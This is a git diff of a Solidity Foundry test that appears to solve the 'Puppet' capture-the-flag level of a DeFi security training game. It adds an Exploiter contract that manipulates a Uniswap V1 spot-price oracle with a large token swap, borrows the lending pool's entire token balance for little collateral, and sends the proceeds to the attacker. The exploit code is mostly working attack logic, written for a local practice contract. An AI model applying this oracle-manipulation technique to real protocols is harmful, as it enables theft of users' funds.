@@ -39,10 +39,10 @@ contract Puppet is Test {
     uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
     uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
 
-    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 1_000e18;
+    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 1000e18;
     uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 25e18;
-    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
-    uint256 internal constant DEADLINE = 10_000_000;
+    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100000e18;
+    uint256 internal constant DEADLINE = 10000000;
 
     UniswapV1Exchange internal uniswapV1ExchangeTemplate;
     UniswapV1Exchange internal uniswapExchange;
@@ -53,7 +53,9 @@ contract Puppet is Test {
     address payable internal attacker;
 
     function setUp() public {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        /**
+         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
+         */
         attacker = payable(
             address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
         );
@@ -118,9 +120,25 @@ contract Puppet is Test {
     }
 
     function testExploit() public {
-        /** EXPLOIT START **/
+        /**
+         * EXPLOIT START *
+         */
 
-        /** EXPLOIT END **/
+        vm.startPrank(attacker);
+        Exploiter exploiter = new Exploiter{value: attacker.balance}(
+            uniswapExchange,
+            dvt,
+            puppetPool,
+            attacker
+        );
+        dvt.transfer(address(exploiter), ATTACKER_INITIAL_TOKEN_BALANCE);
+        exploiter.attack();
+
+        vm.stopPrank();
+
+        /**
+         * EXPLOIT END *
+         */
         validation();
     }
 
@@ -140,5 +158,65 @@ contract Puppet is Test {
         uint256 numerator = input_amount_with_fee * output_reserve;
         uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
         return numerator / denominator;
+    }
+}
+
+contract Exploiter is Test {
+    UniswapV1Exchange internal uniswapExchange;
+    DamnValuableToken internal dvt;
+    PuppetPool internal puppetPool;
+    address payable internal attacker;
+
+    uint256 POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+
+    constructor(
+        UniswapV1Exchange _uniswapExchange,
+        DamnValuableToken _dvt,
+        PuppetPool _puppetPool,
+        address payable _attacker
+    ) payable {
+        uniswapExchange = _uniswapExchange;
+        dvt = _dvt;
+        puppetPool = _puppetPool;
+        attacker = _attacker;
+
+        dvt.approve(address(uniswapExchange), type(uint256).max);
+    }
+
+    function attack() external {
+        uint256 exploiterDVTBalance = dvt.balanceOf(address(this));
+
+        // Manipulate oracle price by inflating exchange's DVT supply
+        uniswapExchange.tokenToEthSwapInput(
+            exploiterDVTBalance,
+            1,
+            type(uint256).max
+        );
+
+        // Empty pool by taking loan at low token valuation
+        puppetPool.borrow{value: address(this).balance}(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+
+        // Send all funds to original sender
+        uint256 dvtStolen = dvt.balanceOf(address(this));
+        dvt.transfer(attacker, dvtStolen);
+        attacker.call{value: address(this).balance}("");
+    }
+
+    fallback() external payable {}
+
+    function calcDepositRequired(uint256 amount)
+        internal
+        view
+        returns (uint256)
+    {
+        return (amount * computeOraclePrice() * 2) / 10e18;
+    }
+
+    function computeOraclePrice() internal view returns (uint256) {
+        return
+            (address(uniswapExchange).balance * (10**18)) /
+            dvt.balanceOf(address(uniswapExchange));
     }
 }
